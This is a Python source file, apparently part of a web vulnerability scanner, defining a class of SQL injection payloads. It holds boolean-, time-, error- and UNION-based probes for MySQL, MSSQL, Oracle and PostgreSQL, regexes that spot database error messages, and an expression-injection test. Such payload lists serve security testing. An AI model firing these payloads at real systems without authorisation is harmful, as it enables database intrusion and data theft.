#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author : Sedate

class SqliPayload():

    '''
    # bool sqli payload
    '''
    bool_payload = [
        (" AND 7178=4981"," AND 6494=6494"),
        (" AND 5674=5389 AND 'OCse'='OCse", " AND 6494=6494 AND 'rOSs'='rOSs"),
        (" AND 8855=1429-- StFP", " AND 6494=6494-- Caxw"),
        (") AND 9768=1487 AND (6356=6356",") AND 6494=6494 AND (6668=6668"),
        (") AND 4303=7910 AND ('PYNh'='PYNh",") AND 6494=6494 AND ('NFFi'='NFFi"),
        ("%' AND 3566=9711 AND '%'='","%' AND 6494=6494 AND '%'='")
    ]

    '''
    # time sqli payload
    '''
    sleep_payload = (
        # mysql_sleep
        " AND SLEEP(5)",
        " AND SLEEP(5)-- Mdda",
        " AND SLEEP(5) AND (4330=4330",
        "' AND SLEEP(5) AND 'IQvl'='IQvl",
        "') AND SLEEP(5) AND ('MjNO'='MjNO",
        ") AND (SELECT * FROM (SELECT(SLEEP(5)))DAFR)-- CQXG",
        "%' AND SLEEP(5) AND '%'='",

        # mssql_sleep
        " WAITFOR DELAY '0:0:5'",
        " WAITFOR DELAY '0:0:5'-- jTkC",
        "%' WAITFOR DELAY '0:0:5' AND '%'='",
        "' WAITFOR DELAY '0:0:5' AND 'nuSw'='nuSw",
        ") WAITFOR DELAY '0:0:5' AND (9501=9501",
        "') WAITFOR DELAY '0:0:5' AND ('TLhK'='TLhK",

        # oracle_sleep
        " AND 9854=DBMS_PIPE.RECEIVE_MESSAGE(CHR(78)||CHR(115)||CHR(80)||CHR(120),5)",
        " AND 9854=DBMS_PIPE.RECEIVE_MESSAGE(CHR(78)||CHR(115)||CHR(80)||CHR(120),5)-- fwlD",
        "' AND 9854=DBMS_PIPE.RECEIVE_MESSAGE(CHR(78)||CHR(115)||CHR(80)||CHR(120),5) AND 'yNJT'='yNJT",
        ") AND 9854=DBMS_PIPE.RECEIVE_MESSAGE(CHR(78)||CHR(115)||CHR(80)||CHR(120),5) AND (5237=5237",
        "') AND 9854=DBMS_PIPE.RECEIVE_MESSAGE(CHR(78)||CHR(115)||CHR(80)||CHR(120),5) AND ('ldZk'='ldZk",
        "%' AND 9854=DBMS_PIPE.RECEIVE_MESSAGE(CHR(78)||CHR(115)||CHR(80)||CHR(120),5) AND '%'='",

        # postgresql_sleep
        " AND 1559=(SELECT 1559 FROM PG_SLEEP(5))",
        " AND 1559=(SELECT 1559 FROM PG_SLEEP(5))-- iNiM",
        "' AND 1559=(SELECT 1559 FROM PG_SLEEP(5)) AND 'tjEj'='tjEj",
        ") AND 1559=(SELECT 1559 FROM PG_SLEEP(5)) AND (6688=6688",
        "') AND 1559=(SELECT 1559 FROM PG_SLEEP(5)) AND ('jGHN'='jGHN",
        "%' AND 1559=(SELECT 1559 FROM PG_SLEEP(5)) AND '%'='"
    )

    '''
    # error sqli payload
    '''
    error_payload = (

        "'))'(",

        # mysql_error
        " AND (SELECT 3605 FROM(SELECT COUNT(*),CONCAT(0x716b627171,(SELECT (ELT(3605=3605,1))),0x717a626b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)",
        "' AND (SELECT 3605 FROM(SELECT COUNT(*),CONCAT(0x716b627171,(SELECT (ELT(3605=3605,1))),0x717a626b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'TolI'='TolI",
        " AND (SELECT 3605 FROM(SELECT COUNT(*),CONCAT(0x716b627171,(SELECT (ELT(3605=3605,1))),0x717a626b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- nDho",
        ") AND (SELECT 3605 FROM(SELECT COUNT(*),CONCAT(0x716b627171,(SELECT (ELT(3605=3605,1))),0x717a626b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND (6396=6396",
        "') AND (SELECT 3605 FROM(SELECT COUNT(*),CONCAT(0x716b627171,(SELECT (ELT(3605=3605,1))),0x717a626b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND ('sLyN'='sLyN",
        "%' AND (SELECT 3605 FROM(SELECT COUNT(*),CONCAT(0x716b627171,(SELECT (ELT(3605=3605,1))),0x717a626b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND '%'='",


        # mssql_error
        " AND 5164 IN (SELECT (CHAR(113)+CHAR(112)+CHAR(106)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (5164=5164) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(113)+CHAR(113)))",
        " AND 5164 IN (SELECT (CHAR(113)+CHAR(112)+CHAR(106)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (5164=5164) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(113)+CHAR(113)))-- EfVr",
        "' AND 5164 IN (SELECT (CHAR(113)+CHAR(112)+CHAR(106)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (5164=5164) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(113)+CHAR(113))) AND 'TtIA'='TtIA",
        ") AND 5164 IN (SELECT (CHAR(113)+CHAR(112)+CHAR(106)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (5164=5164) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(113)+CHAR(113))) AND (3329=3329",
        "') AND 5164 IN (SELECT (CHAR(113)+CHAR(112)+CHAR(106)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (5164=5164) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(113)+CHAR(113))) AND ('igtU'='igtU",
        "%' AND 5164 IN (SELECT (CHAR(113)+CHAR(112)+CHAR(106)+CHAR(112)+CHAR(113)+(SELECT (CASE WHEN (5164=5164) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(118)+CHAR(113)+CHAR(113))) AND '%'='",


        # oracle_error
        " AND 3661=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(107)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (3661=3661) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(113)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)",
        " AND 3661=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(107)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (3661=3661) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(113)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL)-- AeBd",
        "' AND 3661=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(107)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (3661=3661) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(113)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND 'sAJl'='sAJl",
        ") AND 3661=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(107)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (3661=3661) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(113)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND (7044=7044",
        "') AND 3661=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(107)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (3661=3661) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(113)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND ('hdvA'='hdvA",
        "%' AND 3661=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(98)||CHR(107)||CHR(122)||CHR(113)||(SELECT (CASE WHEN (3661=3661) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(106)||CHR(113)||CHR(106)||CHR(113)||CHR(62))) FROM DUAL) AND '%'='",


        # postgresql_error
        " AND 3478=CAST((CHR(113)||CHR(112)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (3478=3478) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(122)||CHR(106)||CHR(113)) AS NUMERIC)",
        " AND 3478=CAST((CHR(113)||CHR(112)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (3478=3478) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(122)||CHR(106)||CHR(113)) AS NUMERIC)-- ZHJJ",
        "' AND 3478=CAST((CHR(113)||CHR(112)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (3478=3478) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(122)||CHR(106)||CHR(113)) AS NUMERIC) AND 'FuxO'='FuxO",
        ") AND 3478=CAST((CHR(113)||CHR(112)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (3478=3478) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(122)||CHR(106)||CHR(113)) AS NUMERIC) AND (7091=7091",
        "') AND 3478=CAST((CHR(113)||CHR(112)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (3478=3478) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(122)||CHR(106)||CHR(113)) AS NUMERIC) AND ('yMsa'='yMsa",
        "%' AND 3478=CAST((CHR(113)||CHR(112)||CHR(107)||CHR(98)||CHR(113))||(SELECT (CASE WHEN (3478=3478) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(122)||CHR(106)||CHR(113)) AS NUMERIC) AND '%'='"
    )

    '''
    # error sqli rules
    '''
    dbms_errors = {
        'MySQL' : (r"SQL syntax",r"MySQL Error",r"Syntax error",r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
        'PostgreSQL' : (r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
        'Microsoft SQL Server' : (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
        'Microsoft Access' : (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
        'Oracle' : (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
        'IBM DB2' : (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
        'SQLite' : (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
        'Sybase' : (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*")
    }

    '''
    # union sqli payload
    '''
    union_payload = (
        ") ORDER BY 1-- gkQq",
        ") UNION ALL SELECT NULL-- fjTK",
        ") UNION ALL SELECT NULL,NULL-- ilWU",
        ") UNION ALL SELECT NULL,NULL,NULL-- KxMt",
        ") UNION ALL SELECT NULL,NULL,NULL,NULL-- hciZ",
        ") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- CSTC",
        ") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- iGYb",
        ") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- uQNv",
        ") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- GdJb",
        ") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ozTo",
        ") UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- RATr",
        " ORDER BY 1-- anwL",
        " UNION ALL SELECT NULL-- FLUx",
        " UNION ALL SELECT NULL,NULL-- UsXo",
        " UNION ALL SELECT NULL,NULL,NULL-- fQvl",
        " UNION ALL SELECT NULL,NULL,NULL,NULL-- WNuD",
        " UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- oQvs",
        " UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- oLtz",
        " UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Klir",
        " UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- pnLN",
        " UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- IMVi",
        " UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- apnj",
        "') ORDER BY 1-- KYqj",
        "') UNION ALL SELECT NULL-- DNaN",
        "') UNION ALL SELECT NULL,NULL-- VSoD",
        "') UNION ALL SELECT NULL,NULL,NULL-- EZSL",
        "') UNION ALL SELECT NULL,NULL,NULL,NULL-- vWVe",
        "') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- UReY",
        "') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- WTnt",
        "') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- oTXl",
        "') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- uURM",
        "') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- PEKg",
        "') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- tzkl",
        "' ORDER BY 1-- cvCo",
        "' UNION ALL SELECT NULL-- AMnM",
        "' UNION ALL SELECT NULL,NULL-- DNgw",
        "' UNION ALL SELECT NULL,NULL,NULL-- HyYd",
        "' UNION ALL SELECT NULL,NULL,NULL,NULL-- YXLh",
        "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- mVSv",
        "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- AoxF",
        "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- HvMo",
        "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- tdFo",
        "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- iHlQ",
        "' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- cZkJ",
        "%' ORDER BY 1-- qbeY",
        "%' UNION ALL SELECT NULL-- DBIA",
        "%' UNION ALL SELECT NULL,NULL-- XiUK",
        "%' UNION ALL SELECT NULL,NULL,NULL-- wfpb",
        "%' UNION ALL SELECT NULL,NULL,NULL,NULL-- DTXv",
        "%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- PRZA",
        "%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ADEE",
        "%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- qRrk",
        "%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Aalt",
        "%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- jsZt",
        "%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- nGYX"
    )

    '''
    # exp_inj
    '''
    exp_inj = {'${6196753-3562104}':'2634649'}